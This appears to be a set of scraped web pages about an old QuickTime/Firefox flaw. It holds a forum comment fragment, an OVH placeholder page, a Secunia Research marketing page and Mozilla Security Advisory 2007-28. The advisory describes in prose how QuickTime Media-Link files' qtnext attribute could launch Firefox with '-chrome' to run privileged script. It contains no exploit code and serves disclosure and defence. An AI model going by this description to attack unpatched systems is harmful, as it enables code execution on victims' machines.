Threat: Bloodhound.Exploit.161![tapasman](//gravatar.com/avatar/17d6341e77fe4d53a943d53009d31e5a?s=256&d=retro)tapasmansweet so none of these execute on my system,\*shaking fist ala Homer\* unless you have something hidden. thanks for the info and sorry you did not get credit for it. I know how you feel I have discovered close to 10 new unknown virueses and hacks and got no credit, oh well atleast my co-workers know.![tapasman](//gravatar.com/avatar/17d6341e77fe4d53a943d53009d31e5a?s=256&d=retro)tapasmanopps IE 6 and QT 6.0![sachinKT](//gravatar.com/avatar/ec2a23cd7415f3f45d113b74968b306b?s=256&d=retro)sachinKTi dont know but some hacks are not working...![radioxid](//gravatar.com/avatar/4e57c9f45beb0845b8810c68876ca1cd?s=256&d=retro)radioxidThe alert doesn't work anymore on FF 20013...

Copyright © 2025 . All rights reserved.



=== Content from www.vupen.com_136eaf11_20250124_175406.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from secunia.com_a15c665f_20250124_175402.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.mozilla.org_04cdf87a_20250124_175404.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2007-28

## Code execution via QuickTime Media-link files

Announced
September 18, 2007
Reporter
Petko D. Petkov
Impact
Critical
Products
Firefox
Fixed in

* Firefox 2.0.0.7

### Description

On his blog [**Petko D. Petkov** reported](http://www.gnucitizen.org/blog/0day-quicktime-pwns-firefox) that QuickTime Media-Link files contain a `qtnext`
attribute that could be used on Windows systems to launch the default browser
with arbitrary command-line options. When the default browser is
Firefox 2.0.0.6 or earlier use of the `-chrome` option allowed a remote
attacker to run script commands with the full privileges of the user. This
could be used to install malware, steal local data, or otherwise corrupt
the victim's computer.

The fix for [MFSA 2007-23](mfsa2007-23.html) was intended
to prevent this type of attack but QuickTime calls the browser in an
unexpected way that bypasses that fix. To protect Firefox users from
this problem we have now eliminated the ability to run arbitrary script
from the command-line. Other command-line options remain, however,
and QuickTime Media-link files could still be used to annoy users
with popup windows and dialogs until this issue is fixed
in QuickTime.

This QuickTime issue appears to be the one described by
[CVE-2006-4965](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4965) but the fix Apple applied in QuickTime 7.1.5
does not prevent this version of the problem.

Gran Paradiso Alpha 8 does not contain the fix
for this vulnerability.

### Workaround

Disabling JavaScript in the browser does *not* protect against this
attack; in vulnerable versions scripts passed through the `-chrome`
option would be executed regardless of the JavaScript setting for web content,
much as interpreters for languages such as **perl** and
**Python** execute scripts passed on the command line.
The [NoScript add-on](https://addons.mozilla.org/firefox/addon/722), however, has provided protection against this class of
attack since the cross-browser vulnerabilities described by MFSA 2007-23
were discovered.

### References

* <https://bugzilla.mozilla.org/show_bug.cgi?id=395942>
* [CVE-2006-4965](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4965)
* ["QuickTime pwns Firefox"](http://www.gnucitizen.org/blog/0day-quicktime-pwns-firefox) (GNUCITIZEN blog)
* [About the security content of QuickTime 7.1.5](http://docs.info.apple.com/article.html?artnum=305149)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


